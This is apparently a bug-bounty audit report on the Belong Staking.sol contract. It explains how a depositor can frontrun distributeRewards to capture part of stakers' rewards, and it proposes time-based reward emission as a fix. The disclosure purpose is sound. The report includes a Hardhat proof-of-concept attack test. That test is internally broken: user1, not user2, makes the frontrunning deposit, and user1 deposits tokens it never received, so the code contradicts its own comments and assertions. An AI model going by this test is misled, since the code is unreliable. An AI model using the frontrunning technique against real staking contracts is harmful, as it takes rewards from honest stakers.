# 56841 sc high sudden addition of rewards will be frontrun with deposits just to steal part of reward

**Submitted on Oct 21st 2025 at 06:49:04 UTC by @kaysoft for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #56841
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/belongnet/checkin-contracts/blob/main/contracts/v2/periphery/Staking.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

### Brief / Intro

Sudden addition of reward token to the Staking.sol will be frontrun with deposits by adversaries just to steal part of the reward and exit after lock duration.

### Vulnerability Details

The `distributeRewards(...)` function adds reward LONG amount to increase the value of user shares at an instant. This invites opportunists that wait until the owner is about to distribute rewards, then frontrun `distributeRewards(...)` with a deposit to obtain shares that immediately become worth more LONG tokens.

After the lock duration the malicious users withdraw their assets plus part of the added reward. Their aim is not to stake as expected by the protocol but to steal part of the rewards that are meant for long-term stakers.

Relevant snippet from Staking.sol:

```solidity
File: Staking.sol
/// @notice Adds rewards to the vault, increasing the asset backing per share.
    /// @dev Caller must approve this contract to pull `amount` LONG beforehand.
    /// @param amount Amount of LONG to transfer in as rewards (must be > 0).
    function distributeRewards(uint256 amount) external onlyOwner {
        if (amount == 0) revert ZeroReward();
        LONG.safeTransferFrom(msg.sender, address(this), amount);
        emit RewardsDistributed(amount);
    }
```

## Impact Details

Attackers can frontrun `distributeRewards(...)` by depositing immediately before a reward distribution, then withdraw after the lock period to capture a portion of the newly added reward, effectively stealing from long-term stakers.

## Recommendation

Consider implementing time-based reward emission (e.g., Synthetix-style reward emission) so users are rewarded based on the duration of staking LONG tokens rather than instantaneous balance increases.

## Proof of Concept

{% stepper %}
{% step %}

### Test setup and transfers

Copy and paste the test below into the `staking.tests.ts` test file in the `'Rewards distribution (rebase)'` test suite and run the test.

This scenario demonstrates user2 frontrunning `distributeRewards` to steal part of the distributed rewards.

Initial transfers:

* user1 and user2 both receive 1000 LONG from admin.
  {% endstep %}

{% step %}

### Staking and frontrun

User1 deposits earlier (start of staking period). Later, just before admin distributes rewards, user2 frontruns the admin by depositing as well. Then admin calls `distributeRewards`.
{% endstep %}

{% step %}

### Withdrawal and result

After shortening the min stake period for the test, user2 redeems immediately after the timelock and is able to withdraw a portion of the distributed reward that should have been for earlier stakers.
{% endstep %}
{% endstepper %}

Test code:

{% code title="staking.tests.ts" %}

```typescript
it('Frontruns distributeRewards (with deposit) to steal rewards', async () => {
      const { staking, long, admin, user1, user2 } = await loadFixture(fixture);

      const depositAmt = ethers.utils.parseEther('1000');
      const reward = ethers.utils.parseEther('250');

      await long.connect(admin).transfer(user1.address, depositAmt);
      await long.connect(admin).transfer(user2.address, depositAmt);
      
      //1. User1 deposits earlier as the start of the staking period
      await long.connect(user1).approve(staking.address, depositAmt);
      await staking.connect(user1).deposit(depositAmt, user1.address);

      //2. After 2 months when other other users have stake their long token in good faith
      //Then admin is about to reward users
      // User2 frontruns admin's distributeRewards just to steal part of the rewards
      await long.connect(user2).approve(staking.address, depositAmt);
      await staking.connect(user1).deposit(depositAmt, user1.address);


      //3. Admin distributeRewards is executed just after user2's deposit
      await long.connect(admin).approve(staking.address, reward);
      await staking.connect(admin).distributeRewards(reward);

      await staking.connect(admin).setMinStakePeriod(1);

      //4. user1 and user2 have same amount of shares
      const shares = await staking.balanceOf(user2.address);
      const expectedAssets = await staking.previewRedeem(shares);


      //5. user2 withdraws immediately after timelock while 
      // user1 keeps their long staked in the contract
      const tx = await staking.connect(user2).redeem(shares, user2.address, user2.address);


      expect(await long.balanceOf(user2.address)).to.eq(expectedAssets);

      //6. User2 is able to take half of the distributed reward and exits
      expect(expectedAssets).to.approximately(depositAmt.add(reward.div(2)), 1);
    });
```

{% endcode %}
